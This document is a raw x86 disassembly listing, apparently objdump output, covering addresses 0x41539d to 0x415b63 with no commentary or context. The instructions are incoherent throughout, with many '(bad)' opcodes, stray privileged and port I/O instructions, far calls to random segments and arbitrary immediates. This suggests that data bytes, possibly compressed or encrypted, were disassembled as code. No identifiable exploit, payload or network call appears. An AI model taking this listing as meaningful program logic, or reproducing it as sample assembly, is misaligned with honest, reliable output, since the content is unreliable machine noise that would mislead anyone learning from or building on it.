  41539d:	dec    edx
  41539e:	int    0x3f
  4153a0:	fcomp  QWORD PTR [ebx]
  4153a2:	inc    eax
  4153a3:	stc    
  4153a4:	add    BYTE PTR [esi],0x86
  4153a7:	lock cmc 
  4153a9:	mov    esp,0x29723f21
  4153ae:	loope  0x4153c9
  4153b0:	fwait
  4153b1:	or     DWORD PTR ds:[edi],0x72
  4153b5:	hlt    
  4153b6:	or     bh,BYTE PTR [ebx+0x3a]
  4153b9:	add    ecx,esi
  4153bb:	sbb    esp,DWORD PTR ds:0x717bee31
  4153c1:	mov    ebx,DWORD PTR [eax+ebx*8-0x13]
  4153c5:	mov    BYTE PTR [ebx+0x442dbdf7],dl
  4153cb:	stos   BYTE PTR es:[edi],al
  4153cc:	test   ah,ah
  4153ce:	adc    ch,BYTE PTR [eax-0x67c6eab]
  4153d4:	mov    ss,WORD PTR [eax]
  4153d6:	mov    ebp,0x93d09d71
  4153db:	mov    bl,0xc7
  4153dd:	inc    esp
  4153de:	data16 ficom DWORD PTR [eax+0x6768cc7f]
  4153e5:	iret   
  4153e6:	mov    edi,0x2ff2514f
  4153eb:	and    BYTE PTR [esi+0x8],dl
  4153ee:	fiadd  WORD PTR [edi-0x6334cfd4]
  4153f4:	jge    0x4153ce
  4153f6:	fisub  DWORD PTR [ecx-0xb]
  4153f9:	arpl   WORD PTR [ebx-0x34831e2c],cx
  4153ff:	and    eax,0xd2483842
  415404:	inc    edi
  415405:	mov    esi,0x93cef930
  41540a:	or     al,0x66
  41540c:	setg   BYTE PTR [edx-0x66]
  415410:	mov    BYTE PTR [ebx-0x26],bh
  415413:	or     edi,ebx
  415415:	fimul  WORD PTR [edi-0x29]
  415418:	out    0x7e,al
  41541a:	iret   
  41541b:	xor    eax,0x42b9f800
  415420:	push   esi
  415421:	(bad)  
  415423:	(bad)  
  415424:	addr16 mov dh,0x6c
  415427:	push   esp
  415428:	sub    bh,BYTE PTR [edx+esi*2-0x6c]
  41542c:	call   edi
  41542e:	repz cld 
  415430:	mov    edi,0x1e6ae8bc
  415435:	xchg   edi,eax
  415436:	test   dh,dl
  415438:	test   BYTE PTR [ecx+ebp*2],ch
  41543b:	add    ch,dl
  41543d:	mov    esp,0xe59faca9
  415442:	adc    dh,bh
  415444:	inc    esp
  415445:	add    al,0xce
  415447:	sti    
  415448:	dec    ebx
  415449:	push   edx
  41544a:	je     0x415432
  41544c:	cdq    
  41544d:	dec    edi
  41544e:	mov    DWORD PTR [ebx+0x36],0xa64a19c0
  415455:	int    0xab
  415457:	cmc    
  415458:	jo     0x415401
  41545a:	jne    0x4154ac
  41545c:	addr16 xchg ebx,eax
  41545e:	(bad)  
  41545f:	sub    al,0x17
  415461:	ss sbb al,0xf4
  415464:	aad    0xf1
  415466:	into   
  415467:	cli    
  415468:	enter  0xc33,0xf2
  41546c:	cdq    
  41546d:	sbb    eax,0xcf8a1c3d
  415472:	retf   0x8081
  415475:	(bad)  
  415476:	out    0x9f,eax
  415478:	sub    ebp,0xffffffd2
  41547b:	jo     0x4154d6
  41547d:	push   es
  41547e:	push   es
  41547f:	(bad)  
  415480:	sbb    eax,0x5d5072c3
  415485:	and    cl,BYTE PTR [esi-0x29]
  415488:	jl     0x41547b
  41548a:	ss push esp
  41548c:	(bad)  [esi+0x66]
  41548f:	sub    eax,0x518b5176
  415494:	adc    edx,0xffffff87
  415497:	fisttp QWORD PTR [ecx+eax*8+0x13]
  41549b:	fdivr  QWORD PTR [edi+0x2e]
  41549e:	mov    al,0xf
  4154a0:	add    eax,0x5f5f1b0f
  4154a5:	idiv   BYTE PTR [eax+0x2ff8fca7]
  4154ab:	pop    ss
  4154ac:	sub    al,0x40
  4154ae:	gs xchg ebx,eax
  4154b0:	dec    ebp
  4154b1:	add    BYTE PTR [edi-0x59],al
  4154b4:	push   cs
  4154b5:	pop    ds
  4154b6:	mov    al,ds:0x408cfa61
  4154bb:	xchg   esi,eax
  4154bc:	ret    0xea0a
  4154bf:	es mov ebp,0xf6b751b0
  4154c5:	adc    cl,BYTE PTR [ebp-0x69f7bbd5]
  4154cb:	(bad)  
  4154cd:	inc    eax
  4154ce:	sbb    BYTE PTR [eax+0x25e2220],cl
  4154d4:	call   0x95f2:0xcd53ec2c
  4154db:	cmp    al,0x92
  4154dd:	xchg   ebx,eax
  4154de:	xchg   edi,eax
  4154df:	fistp  WORD PTR [edx-0x1f192cde]
  4154e5:	mov    ds:0x1ac91844,al
  4154ea:	cmp    ebx,DWORD PTR [edx-0x6b06d18c]
  4154f0:	push   ss
  4154f1:	jae    0x41552e
  4154f3:	push   esi
  4154f4:	cwde   
  4154f5:	clc    
  4154f6:	mov    eax,0x8869edb3
  4154fb:	loopne 0x415483
  4154fd:	jge    0x4154c0
  4154ff:	inc    edx
  415500:	in     al,dx
  415501:	mov    bh,0xb7
  415503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415504:	mov    ecx,0xd136e62b
  415509:	jmp    0xc382:0x45bdb142
  415510:	add    BYTE PTR [edi+0x10],dl
  415513:	iret   
  415514:	sti    
  415515:	mov    edi,0x2ed3d38f
  41551a:	(bad)  
  41551b:	les    edi,FWORD PTR [ebx-0x77a4d4a6]
  415521:	sub    ah,BYTE PTR [edx-0x3a20b6a5]
  415527:	sbb    esp,DWORD PTR [si-0x30a4]
  41552c:	in     eax,0x3a
  41552e:	mov    ah,0x55
  415530:	in     eax,0xb1
  415532:	addr16 cwde 
  415534:	out    0x9d,eax
  415536:	mov    WORD PTR [ebp+edi*2+0xf5aa513],?
  41553d:	jmp    0x684e1fe4
  415542:	jp     0x4154ed
  415544:	mov    WORD PTR [edx+edi*8+0x298d7ffd],cs
  41554b:	push   ecx
  41554c:	lahf   
  41554d:	scas   al,BYTE PTR es:[edi]
  41554e:	xchg   esi,eax
  41554f:	xchg   esi,eax
  415550:	rcl    DWORD PTR [edx],1
  415552:	arpl   WORD PTR [ebx-0x677523b3],bp
  415558:	lea    esp,[eax-0x4456ccef]
  41555e:	add    al,0xba
  415560:	mov    ebx,0x3ebb3b63
  415566:	pushf  
  415567:	ins    BYTE PTR es:[edi],dx
  415568:	es push eax
  41556a:	(bad)  
  41556b:	out    0x78,al
  41556d:	imul   ecx
  41556f:	xor    BYTE PTR [ebx-0x22c16831],ah
  415575:	dec    eax
  415576:	mov    dx,0xf3b4
  41557a:	inc    ebx
  41557b:	cwde   
  41557c:	sub    eax,0xe6a4e844
  415581:	stos   DWORD PTR es:[edi],eax
  415582:	sbb    DWORD PTR [edi+ebp*1-0x50],edx
  415586:	xchg   ecx,eax
  415587:	xor    ecx,DWORD PTR [ebx+ebx*8-0x441f3b39]
  41558e:	std    
  41558f:	push   esp
  415590:	sbb    DWORD PTR ds:0xdd38dbfa,ebx
  415596:	das    
  415597:	cs pop esi
  415599:	sti    
  41559a:	test   al,0x46
  41559c:	in     al,dx
  41559d:	adc    dh,BYTE PTR [esi+0x6cdd6d9f]
  4155a3:	(bad)  
  4155a4:	jns    0x4155b8
  4155a6:	fadd   QWORD PTR [ebp+0x29665c17]
  4155ac:	add    al,0x30
  4155ae:	mov    al,0x81
  4155b0:	push   ebp
  4155b1:	call   0x6551f5df
  4155b6:	jb     0x415592
  4155b8:	dec    eax
  4155b9:	ret    
  4155ba:	inc    esi
  4155bb:	call   0x93f9:0xdaca16f2
  4155c2:	push   esp
  4155c3:	mov    BYTE PTR [eax+eiz*2],bh
  4155c6:	loope  0x41555e
  4155c8:	ror    BYTE PTR [esi-0x2f7a6ed8],1
  4155ce:	adc    al,0xd2
  4155d0:	sbb    eax,0x4162783d
  4155d5:	mov    ch,0xb
  4155d7:	sar    DWORD PTR [edx-0x2c533270],0x9
  4155de:	xchg   esi,eax
  4155df:	lock lods al,BYTE PTR ds:[esi]
  4155e1:	xor    al,0x95
  4155e3:	adc    edi,DWORD PTR [edi+0x11b527e4]
  4155e9:	xor    eax,DWORD PTR [ecx+0x7d976f4]
  4155ef:	popf   
  4155f0:	xchg   ebp,eax
  4155f1:	and    bh,BYTE PTR [edx+0x63fc8dbb]
  4155f7:	call   0xf4979a61
  4155fc:	pop    ebx
  4155fd:	sar    bl,1
  4155ff:	(bad)  
  415600:	mov    ch,0x1c
  415602:	ss jnp 0x41559d
  415605:	sar    BYTE PTR [edi+0x10],1
  415608:	out    dx,eax
  415609:	xchg   ebp,eax
  41560a:	aam    0x1a
  41560c:	push   ebp
  41560d:	lea    edi,[eax-0x21ff74f3]
  415613:	or     BYTE PTR [esi+0x2efb4556],cl
  415619:	daa    
  41561a:	out    0x57,al
  41561c:	sub    al,0x25
  41561e:	ds call 0x973c:0xc0d6ba8d
  415626:	retf   0xf7b0
  415629:	pop    ecx
  41562a:	pop    ds
  41562b:	stos   BYTE PTR es:[edi],al
  41562c:	push   ds
  41562d:	jecxz  0x415629
  41562f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415630:	add    eax,esi
  415632:	(bad)  
  415633:	icebp  
  415634:	aad    0xfe
  415636:	inc    ecx
  415637:	popa   
  415638:	jae    0x415691
  41563a:	pop    ecx
  41563b:	(bad)  
  41563d:	lods   al,BYTE PTR ds:[esi]
  41563e:	mov    esi,0x2744d5aa
  415643:	iret   
  415644:	ret    
  415645:	or     BYTE PTR [ecx+0x55],dl
  415648:	ror    DWORD PTR [edx-0x379cb99a],1
  41564e:	cmp    eax,0xf7754eb1
  415653:	mov    al,0x4a
  415655:	(bad)  
  415656:	fbstp  TBYTE PTR [edi-0x41faf585]
  41565c:	cmp    eax,0xdfa44d0d
  415661:	push   0xc754e50b
  415666:	sti    
  415667:	pushf  
  415668:	aaa    
  415669:	cdq    
  41566a:	mov    al,ds:0x785cc03a
  41566f:	adc    eax,0xf403c5a5
  415674:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415675:	cmc    
  415676:	jle    0x4156ab
  415678:	mov    ah,0x26
  41567a:	int    0x27
  41567c:	mov    ah,bh
  41567e:	(bad)  
  415680:	push   ds
  415681:	in     al,dx
  415682:	scas   eax,DWORD PTR es:[edi]
  415683:	pusha  
  415684:	stos   BYTE PTR es:[edi],al
  415685:	scas   al,BYTE PTR es:[edi]
  415686:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415687:	inc    ecx
  415688:	jmp    0x3b38afc4
  41568d:	sbb    BYTE PTR [eax],bh
  41568f:	dec    edi
  415690:	pop    ecx
  415691:	inc    edx
  415692:	jb     0x415685
  415694:	sub    DWORD PTR [edi+0x7f],ebp
  415697:	dec    ebx
  415698:	push   0xffffffb7
  41569a:	clc    
  41569b:	aam    0xf8
  41569d:	fiadd  WORD PTR [edx+0x69]
  4156a0:	mov    dh,0x9c
  4156a2:	pop    es
  4156a3:	test   BYTE PTR [edi+0x2fc0b991],ah
  4156a9:	out    dx,al
  4156aa:	and    BYTE PTR [eax-0x3c60f53c],dh
  4156b0:	xor    eax,0x3da67626
  4156b5:	jmp    0xa66cc605
  4156ba:	retf   
  4156bb:	inc    edi
  4156bc:	fwait
  4156bd:	cmp    al,0xe2
  4156bf:	(bad)  
  4156c0:	cmp    ecx,ecx
  4156c2:	sub    al,0xaf
  4156c4:	sbb    DWORD PTR [ebp+0x523297c2],ebp
  4156ca:	sti    
  4156cb:	lahf   
  4156cc:	pop    edi
  4156cd:	outs   dx,DWORD PTR ds:[esi]
  4156ce:	or     DWORD PTR [eax+0x2a],esp
  4156d1:	sar    cl,1
  4156d3:	(bad)  
  4156d4:	fdiv   QWORD PTR [esi+0x6909f258]
  4156da:	fisubr DWORD PTR [ebx]
  4156dc:	sub    al,0x4
  4156de:	imul   eax,DWORD PTR [esi+0x4],0xaf04fbd5
  4156e5:	clc    
  4156e6:	dec    edi
  4156e7:	dec    esi
  4156e8:	inc    esp
  4156e9:	ins    DWORD PTR es:[edi],dx
  4156ea:	dec    esp
  4156eb:	loope  0x4156e4
  4156ed:	push   edi
  4156ee:	dec    edx
  4156ef:	push   ebx
  4156f0:	mov    ebx,0xc1aa9b8c
  4156f5:	mov    ebp,0x6174ec27
  4156fa:	pop    edi
  4156fb:	aaa    
  4156fc:	pop    ebp
  4156fd:	xchg   esp,eax
  4156fe:	(bad)  
  4156ff:	or     eax,DWORD PTR [edi]
  415701:	fwait
  415702:	jnp    0x415729
  415704:	xchg   cl,bl
  415706:	ds out dx,al
  415708:	fdivr  DWORD PTR ds:0x3629c16c
  41570e:	sub    al,BYTE PTR [ecx]
  415710:	fisub  DWORD PTR [esi-0x5e]
  415713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415714:	in     eax,dx
  415715:	push   ecx
  415716:	ins    DWORD PTR es:[edi],dx
  415717:	test   BYTE PTR [edi+0x35],dh
  41571a:	std    
  41571b:	mov    dl,0x5b
  41571d:	dec    edx
  41571e:	out    dx,eax
  41571f:	fwait
  415720:	push   esp
  415721:	mov    ds:0x6952a02d,eax
  415726:	cmc    
  415727:	dec    ebx
  415728:	std    
  415729:	hlt    
  41572a:	lods   eax,DWORD PTR ds:[esi]
  41572b:	fsub   DWORD PTR [ecx+0x5c]
  41572e:	ret    
  41572f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415730:	mov    esp,0x94736650
  415735:	das    
  415736:	mov    esi,0xcb07841e
  41573b:	xchg   esi,eax
  41573c:	push   edi
  41573d:	jl     0x4156ec
  41573f:	mov    cl,0xe0
  415741:	enter  0x9048,0xb5
  415745:	sbb    DWORD PTR [ebp+0x12],edx
  415748:	jmp    0x1d45bf9
  41574d:	xchg   DWORD PTR [ecx],ebx
  41574f:	stos   DWORD PTR es:[edi],eax
  415750:	mov    al,ds:0xe0e00ace
  415755:	mov    dl,0x2e
  415757:	cmp    eax,0x653e0680
  41575c:	mov    al,dl
  41575e:	jle    0x41578f
  415760:	pop    edi
  415761:	inc    esi
  415762:	cmc    
  415763:	(bad)  
  415764:	(bad)  
  415766:	or     al,0x61
  415768:	pop    ds
  415769:	cmp    al,ch
  41576b:	and    BYTE PTR [eax+0x40],dl
  41576e:	pusha  
  41576f:	pop    esi
  415770:	addr16 sub eax,0xddd9bc1
  415776:	pop    esi
  415777:	hlt    
  415778:	ins    DWORD PTR es:[edi],dx
  415779:	aad    0x50
  41577b:	mov    ds:0x952d5b31,eax
  415780:	xchg   ecx,eax
  415781:	mov    esp,0x6d296a7a
  415786:	xchg   edi,eax
  415787:	in     eax,0xab
  415789:	jae    0x41574a
  41578b:	cdq    
  41578c:	inc    edi
  41578d:	adc    edx,DWORD PTR [edi]
  41578f:	dec    edi
  415790:	cmp    ecx,esp
  415792:	das    
  415793:	dec    ebp
  415794:	xor    ch,cl
  415796:	adc    BYTE PTR [eax+0x5d],cl
  415799:	jns    0x41577d
  41579b:	nop
  41579c:	adc    eax,0xc9407653
  4157a1:	das    
  4157a2:	cmovg  edi,DWORD PTR [edx]
  4157a5:	data16 cmc 
  4157a7:	test   DWORD PTR [ebp+0x4a],edx
  4157aa:	sub    al,dh
  4157ac:	push   ebx
  4157ad:	aam    0x84
  4157af:	stos   DWORD PTR es:[edi],eax
  4157b0:	pop    ecx
  4157b1:	sub    eax,0x7abaaf2c
  4157b6:	sub    al,0x12
  4157b8:	add    al,0x19
  4157ba:	inc    eax
  4157bb:	and    ecx,DWORD PTR [eax]
  4157bd:	jle    0x41574a
  4157bf:	pop    ecx
  4157c0:	call   0xacba:0xa2778a15
  4157c7:	fidivr WORD PTR ss:[eax+0x5b]
  4157cb:	add    al,0x6e
  4157cd:	mov    bh,0x8b
  4157cf:	and    ebp,eax
  4157d1:	int3   
  4157d2:	inc    ebp
  4157d3:	pop    eax
  4157d4:	imul   esi,DWORD PTR [eax+eax*2-0x62],0x34
  4157d9:	fwait
  4157da:	xor    BYTE PTR [edx+0x4923e0fd],dh
  4157e0:	xchg   ecx,eax
  4157e1:	mov    ecx,0x60ffb563
  4157e6:	inc    edx
  4157e7:	pop    ds
  4157e8:	mov    cl,BYTE PTR [ebx+ebp*4]
  4157eb:	(bad)  
  4157ec:	push   ecx
  4157ed:	aaa    
  4157ee:	mov    ah,BYTE PTR [ecx-0x7032422b]
  4157f4:	pop    esi
  4157f5:	enter  0xac1e,0x9e
  4157f9:	icebp  
  4157fa:	(bad)  
  4157fb:	xor    eax,DWORD PTR [ebp+0x5d9ef607]
  415801:	cdq    
  415802:	or     eax,0x217616ff
  415807:	dec    esp
  415808:	xchg   esp,eax
  415809:	pop    esi
  41580a:	sub    dh,0xcb
  41580d:	jg     0x415823
  41580f:	mov    WORD PTR [edx+0x7f],?
  415812:	(bad)  
  415813:	mov    ds:0x87987ab5,al
  415818:	adc    DWORD PTR [ebx],0x37
  41581b:	loopne 0x41587f
  41581d:	cwde   
  41581e:	retf   0xb491
  415821:	(bad)  
  415822:	aaa    
  415823:	push   es
  415824:	mov    fs,esi
  415826:	and    esp,esp
  415828:	mov    ds:0x7e319d40,al
  41582d:	inc    eax
  41582e:	jmp    0x74b8b12
  415833:	mov    BYTE PTR [ebx-0x2b2ca900],ch
  415839:	cmp    BYTE PTR ds:0x72f545df,cl
  41583f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415840:	call   0x900b:0xd594fa08
  415847:	cmp    ch,cl
  415849:	in     al,dx
  41584a:	inc    edx
  41584b:	pop    ss
  41584c:	dec    esi
  41584d:	lods   al,BYTE PTR ds:[esi]
  41584e:	pop    es
  41584f:	mov    ebx,0x99dde521
  415854:	dec    ecx
  415855:	ja     0x415820
  415857:	sahf   
  415858:	push   edi
  415859:	lock cmp edx,esi
  41585c:	sub    DWORD PTR [ecx+0x736e6648],eax
  415862:	mov    ch,BYTE PTR [esi+0x32603e3c]
  415868:	lods   eax,DWORD PTR ds:[esi]
  415869:	inc    edx
  41586a:	mov    ecx,0x85a9bdf7
  41586f:	ret    0x7809
  415872:	push   ss
  415873:	sar    BYTE PTR [esi+esi*4],0x34
  415877:	aam    0x32
  415879:	jbe    0x415830
  41587b:	sti    
  41587c:	mov    bh,0xc3
  41587e:	(bad)  
  41587f:	fisttp WORD PTR [edx-0x56bf283c]
  415885:	and    ah,BYTE PTR [edx+0x7c1b9b53]
  41588b:	add    eax,0x6dc34a38
  415890:	nop
  415891:	push   edi
  415892:	adc    DWORD PTR [edi+eiz*1],esi
  415895:	pop    eax
  415896:	aad    0x87
  415898:	fwait
  415899:	adc    DWORD PTR [ebx],edx
  41589b:	jb     0x41582d
  41589d:	push   ebp
  41589e:	or     dl,dh
  4158a0:	cmp    eax,0x53f91301
  4158a5:	jo     0x41584d
  4158a7:	push   edi
  4158a8:	scas   al,BYTE PTR es:[edi]
  4158a9:	fbstp  TBYTE PTR [edx-0x3d2ad7c0]
  4158af:	stc    
  4158b0:	cdq    
  4158b1:	sbb    eax,0x471da4e9
  4158b6:	popf   
  4158b7:	pop    ss
  4158b8:	rol    BYTE PTR [ebx],cl
  4158ba:	dec    ebx
  4158bb:	mov    BYTE PTR [edx+0x55],dl
  4158be:	pop    esi
  4158bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158c0:	ss ret 
  4158c2:	arpl   WORD PTR [eax+0x2b],sp
  4158c5:	xchg   ebx,eax
  4158c6:	cmp    eax,0x9b14f763
  4158cb:	repz add BYTE PTR [ecx-0x6d],0x78
  4158d0:	bound  eax,QWORD PTR [edx]
  4158d2:	push   ds
  4158d3:	pop    ecx
  4158d4:	jne    0x4158af
  4158d6:	jg     0x41585a
  4158d8:	cwde   
  4158d9:	jo     0x41591a
  4158db:	mov    es,edi
  4158dd:	dec    ecx
  4158de:	ja     0x415914
  4158e0:	(bad)  
  4158e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e3:	lock xchg BYTE PTR [edi+edi*2],dl
  4158e7:	mov    ss,WORD PTR [esi]
  4158e9:	adc    DWORD PTR [edx+eiz*1],ebx
  4158ec:	or     ecx,DWORD PTR [ebp+0x63]
  4158ef:	fmul   QWORD PTR [ebp-0x5c94ec95]
  4158f5:	mov    WORD PTR [esi-0x24],ds
  4158f8:	into   
  4158f9:	or     eax,0x457b3049
  4158fe:	ror    DWORD PTR [ecx],cl
  415900:	add    ecx,edi
  415902:	jl     0x4158fd
  415904:	xor    BYTE PTR [edi-0x46a91192],dh
  41590a:	retf   
  41590b:	or     DWORD PTR [edx+eiz*4],0xe
  41590f:	fimul  DWORD PTR [ebx]
  415911:	cdq    
  415912:	sar    DWORD PTR [ecx],cl
  415914:	jne    0x415900
  415916:	xchg   esp,eax
  415917:	or     al,0x79
  415919:	xor    al,0x61
  41591b:	jp     0x4158a3
  41591d:	pop    ebx
  41591e:	and    cl,BYTE PTR [ebx-0x45]
  415921:	mov    ds:0xaad9f157,al
  415926:	sub    DWORD PTR [edx+edi*1+0x21],edx
  41592a:	xor    eax,0x42fc9a5a
  41592f:	mov    ebx,0x7d1ec967
  415934:	mov    al,0xc2
  415936:	dec    edi
  415937:	dec    ecx
  415938:	bound  ebp,QWORD PTR [ebx+0xcbb5740]
  41593e:	dec    esp
  41593f:	pop    ecx
  415940:	push   ebx
  415941:	test   eax,0x66210ac6
  415946:	ror    BYTE PTR ds:0x2f3f8271,1
  41594c:	(bad)  
  41594e:	mov    bh,0x36
  415950:	cmp    esp,ebp
  415952:	aaa    
  415953:	push   0xd5ce76d0
  415958:	shl    DWORD PTR [edx+0x344c17ca],1
  41595e:	sbb    DWORD PTR [ebp+0x6],esp
  415961:	lock stc 
  415963:	inc    esi
  415964:	pop    ecx
  415965:	jae    0x415948
  415967:	ficom  WORD PTR [edi+0x20e77dc2]
  41596d:	or     BYTE PTR [edx],cl
  41596f:	(bad)  
  415970:	fimul  WORD PTR [edi+0x706e3068]
  415976:	ds je  0x4159e9
  415979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41597a:	sub    al,cl
  41597c:	ins    BYTE PTR es:[edi],dx
  41597d:	std    
  41597e:	pop    ds
  41597f:	xchg   edi,eax
  415980:	push   ebx
  415981:	sub    DWORD PTR [eax],esp
  415983:	xor    eax,0x471fea66
  415988:	mov    ch,0x80
  41598a:	inc    esp
  41598b:	push   edi
  41598c:	push   ss
  41598d:	cmp    BYTE PTR [ebx-0x99c22d4],dl
  415993:	sbb    al,0x7e
  415995:	test   al,0x9e
  415997:	xchg   edx,eax
  415998:	setp   BYTE PTR [eax]
  41599b:	(bad)
  4159a0:	out    dx,al
  4159a1:	mov    bh,0x8
  4159a3:	leave  
  4159a4:	in     al,0xab
  4159a6:	xchg   esi,eax
  4159a7:	xcrypt-ofb (bad)
  4159a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159a9:	outs   dx,BYTE PTR ds:[esi]
  4159aa:	aas    
  4159ab:	popf   
  4159ac:	mov    cl,0xb7
  4159ae:	fcomp  QWORD PTR [ebp-0x40]
  4159b1:	add    BYTE PTR [edx-0x6a79a5f1],0x2c
  4159b8:	push   eax
  4159b9:	call   0xa2e4:0xa0893bb6
  4159c0:	dec    eax
  4159c1:	pop    edx
  4159c2:	les    ebx,FWORD PTR [ecx]
  4159c4:	mov    dl,0xa
  4159c6:	push   ds
  4159c7:	pop    edx
  4159c8:	out    dx,al
  4159c9:	stc    
  4159ca:	adc    DWORD PTR ds:0x455ebaf9,ebp
  4159d0:	cwde   
  4159d1:	adc    BYTE PTR [eax+edi*1],dl
  4159d4:	repz or DWORD PTR [edi-0xc7d3783],0x9a3ca7b3
  4159df:	cmp    BYTE PTR [edx-0x53b00cda],ah
  4159e5:	xor    BYTE PTR [esi+0x51c6cc25],cl
  4159eb:	into   
  4159ec:	aam    0x94
  4159ee:	mov    cl,ch
  4159f0:	cdq    
  4159f1:	sar    BYTE PTR ds:0x9361,0xae
  4159f7:	pop    es
  4159f8:	mov    eax,ds:0x313906c8
  4159fd:	sbb    bh,dh
  4159ff:	and    al,0xa4
  415a01:	push   ss
  415a02:	mov    BYTE PTR [ebx],ch
  415a04:	xor    al,0x90
  415a06:	das    
  415a07:	xor    ah,dh
  415a09:	imul   ecx,DWORD PTR [edi+esi*4-0x3c],0xf0d3d38
  415a11:	mov    dh,BYTE PTR [ecx]
  415a13:	(bad)  
  415a15:	push   ds
  415a16:	bound  esi,QWORD PTR [edx]
  415a18:	sbb    edx,ebx
  415a1a:	lods   eax,DWORD PTR ds:[esi]
  415a1b:	xchg   esi,eax
  415a1c:	mov    ds:0x92ef8497,eax
  415a21:	cs xchg edi,eax
  415a23:	or     ecx,edx
  415a25:	dec    ebp
  415a26:	push   esp
  415a27:	add    eax,0xfcd0f0f4
  415a2c:	add    BYTE PTR [edi+0x358b091],cl
  415a32:	hlt    
  415a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a34:	adc    DWORD PTR [ebx],edi
  415a36:	mov    al,ds:0x38363339
  415a3b:	out    dx,al
  415a3c:	sub    eax,0xcaddf6d2
  415a41:	jl     0x4159c8
  415a43:	das    
  415a44:	sbb    BYTE PTR [ebx+0x63],dl
  415a47:	pop    esp
  415a48:	aad    0x65
  415a4a:	addr16 dec esp
  415a4c:	xchg   DWORD PTR [edi+0x1be30d45],edx
  415a52:	jnp    0x415ab2
  415a54:	scas   eax,DWORD PTR es:[edi]
  415a55:	data16 cld 
  415a57:	popf   
  415a58:	sbb    al,0x28
  415a5a:	sbb    edi,DWORD PTR [edi]
  415a5c:	mov    ds:0x5dbf045a,eax
  415a61:	xor    bh,ch
  415a63:	jb     0x415a6b
  415a65:	xchg   DWORD PTR [ebx-0x34dd7c6f],ebx
  415a6b:	jmp    0x4159fb
  415a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a6e:	cdq    
  415a6f:	xor    DWORD PTR [ebp+0x16999411],ebp
  415a75:	mov    ebp,0xc68aad17
  415a7a:	adc    BYTE PTR [edi+0x18],al
  415a7d:	pop    ebx
  415a7e:	dec    eax
  415a7f:	lock adc BYTE PTR [ecx+0x42c0920a],dh
  415a86:	hlt    
  415a87:	pop    esp
  415a88:	pop    esp
  415a89:	lea    ecx,[edx]
  415a8b:	in     al,dx
  415a8c:	mov    eax,ds:0xd653f721
  415a91:	in     eax,dx
  415a92:	mov    ds:0x92fbba1c,al
  415a97:	lods   al,BYTE PTR ds:[esi]
  415a98:	(bad)  
  415a99:	out    dx,al
  415a9a:	sar    BYTE PTR [eax+ebx*2],0x57
  415a9e:	dec    esp
  415a9f:	aad    0xbb
  415aa1:	pushf  
  415aa2:	push   edi
  415aa3:	lock into 
  415aa5:	popf   
  415aa6:	fiadd  WORD PTR [edx+0x1fb21e76]
  415aac:	pushw  cs
  415aae:	cld    
  415aaf:	and    edx,DWORD PTR ds:[esi+0x2ffb5143]
  415ab6:	pop    esi
  415ab7:	jmp    0x549880be
  415abc:	sub    esi,eax
  415abe:	jmp    0x415ae0
  415ac0:	ins    DWORD PTR es:[edi],dx
  415ac1:	dec    esp
  415ac2:	or     al,0x4c
  415ac4:	ja     0x415a7f
  415ac6:	dec    edx
  415ac7:	(bad)  
  415ac8:	pop    edi
  415ac9:	pop    esi
  415aca:	cs dec ebx
  415acc:	mov    dh,0x4c
  415ace:	xchg   esp,eax
  415acf:	pop    eax
  415ad0:	xchg   ebp,eax
  415ad1:	jno    0x415a73
  415ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ad4:	cmp    bh,BYTE PTR [edi-0x5664a42a]
  415ada:	aad    0xe5
  415adc:	inc    esi
  415add:	adc    ebx,DWORD PTR [esi+0x68]
  415ae0:	lahf   
  415ae1:	mov    eax,0xa6b2ffb0
  415ae6:	inc    ebp
  415ae7:	std    
  415ae8:	or     bl,0x55
  415aeb:	and    ebx,DWORD PTR [esi-0x50977ea7]
  415af1:	pop    ecx
  415af2:	inc    edi
  415af3:	fwait
  415af4:	clc    
  415af5:	dec    ecx
  415af6:	xor    bh,dl
  415af8:	aam    0x3c
  415afa:	scas   eax,DWORD PTR es:[edi]
  415afb:	fimul  DWORD PTR [ecx]
  415afd:	cwde   
  415afe:	cmp    BYTE PTR [esp+edi*4-0x5e],dl
  415b02:	lahf   
  415b03:	and    al,0x7d
  415b05:	(bad)  
  415b06:	lea    ecx,[esi-0x46]
  415b09:	inc    ebp
  415b0a:	mov    edi,0xce2c0068
  415b0f:	ins    DWORD PTR es:[edi],dx
  415b10:	jns    0x415ae5
  415b12:	stos   DWORD PTR es:[edi],eax
  415b13:	pop    ss
  415b14:	jg     0x415ace
  415b16:	push   ecx
  415b17:	xchg   ebx,eax
  415b18:	push   ss
  415b19:	(bad)  
  415b1b:	call   0x556e22fb
  415b20:	(bad)  
  415b21:	jae    0x415b19
  415b23:	in     al,0x12
  415b25:	imul   ebp,DWORD PTR [esi+0x75ac400d],0xffffffd8
  415b2c:	dec    DWORD PTR [ecx]
  415b2e:	cmp    al,0x79
  415b30:	adc    BYTE PTR ds:0xe18c0daf,ch
  415b36:	jge    0x415adb
  415b38:	and    BYTE PTR [edi-0x7b],0xe7
  415b3c:	jnp    0x415b3c
  415b3e:	and    dh,ah
  415b40:	adc    esi,DWORD PTR [edi]
  415b42:	xchg   esp,eax
  415b43:	scas   eax,DWORD PTR es:[edi]
  415b44:	pushf  
  415b45:	ffreep st(4)
  415b47:	dec    eax
  415b48:	push   eax
  415b49:	scas   eax,DWORD PTR es:[edi]
  415b4a:	ins    DWORD PTR es:[edi],dx
  415b4b:	in     al,0x2d
  415b4d:	xchg   BYTE PTR [ebx+0x2f],ch
  415b50:	jo     0x415b26
  415b52:	sub    DWORD PTR ds:0x96994952,esp
  415b58:	push   eax
  415b59:	stc    
  415b5a:	aad    0xdb
  415b5c:	cdq    
  415b5d:	repnz push edx
  415b5f:	repnz mov DWORD PTR [edx-0x55],edi
  415b63:	mov    DWORD PTR [ecx-0x7a],esp
